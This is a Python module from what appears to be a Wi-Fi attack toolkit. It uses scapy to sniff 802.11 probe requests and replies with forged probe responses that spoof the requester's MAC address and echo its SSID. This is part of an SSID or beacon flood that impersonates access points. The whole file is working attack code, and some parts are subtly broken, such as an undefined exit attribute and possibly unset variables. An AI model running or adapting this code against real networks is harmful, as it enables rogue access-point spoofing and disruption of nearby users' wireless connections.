import logging
from multiprocessing import Process
from scapy.all import (
    sendp,
    sniff,
    RadioTap,
    Dot11,
    Dot11Elt,
    Dot11ProbeResp,
    Dot11ProbeReq,
)
from lcubo_helpers import uptime

from wifi_tools import redis_server

logger = logging.getLogger(__name__)


class ProbeRequestFloodSniffer(Process):

    def __init__(self, iface):
        self.iface = iface
        super(ProbeRequestFloodSniffer, self).__init__()

    def run(self):
        sniff(self.iface, prn=self.analize_packet, store=0)

    def stop(self):
        logger.info('Stopping ProbeRequestFloodSniffer process')
        self.exit.set()

    def analize_packet(self, pkt):
        current_attack = redis_server.get('current_attack')
        if current_attack != 'beacon_flood':
            self.stop()
        if pkt.haslayer(Dot11):
            if pkt.haslayer(Dot11ProbeResp) or pkt.haslayer(Dot11ProbeReq):
                self._flood_probe_answer(pkt)

    def _flood_probe_answer(self, pkt):
        macs = redis_server.lrange('flood_macs', 0, -1)
        # pkt = pkt.getlayer(Dot11Elt)
        addr1 = pkt.addr1
        addr2 = pkt.addr2
        if pkt.addr1 not in macs:
            logger.debug('SSID Flood mode, but req mac was not in our list.')
        while pkt:
            if pkt.ID == 0:

                # ID 0's info portion of a 802.11 packet is the SSID, grab it
                ssid = pkt.info
            if pkt.ID == 1:

                # ID 1's info portion of a 802.11 packet is the supported rates, grab it
                rates = pkt.info
            pkt = pkt.payload
        sendp(RadioTap(present=18479)/
                Dot11(addr2=addr1, addr3=addr1, addr1=addr2, FCfield=8)/
                Dot11ProbeResp(beacon_interval=102, cap=12548, timestamp=uptime())/
                Dot11Elt(info=ssid, ID=0)/
                Dot11Elt(info=rates, ID=1)/
                Dot11Elt(info='\x01', ID=3, len=1)/
                Dot11Elt(info='\x00', ID=42, len=1)/
                Dot11Elt(info='\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x02\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02(\x00', ID=48, len=24)/
                Dot11Elt(info='H`l', ID=50, len=3), iface=self.iface, loop=0, verbose=False)
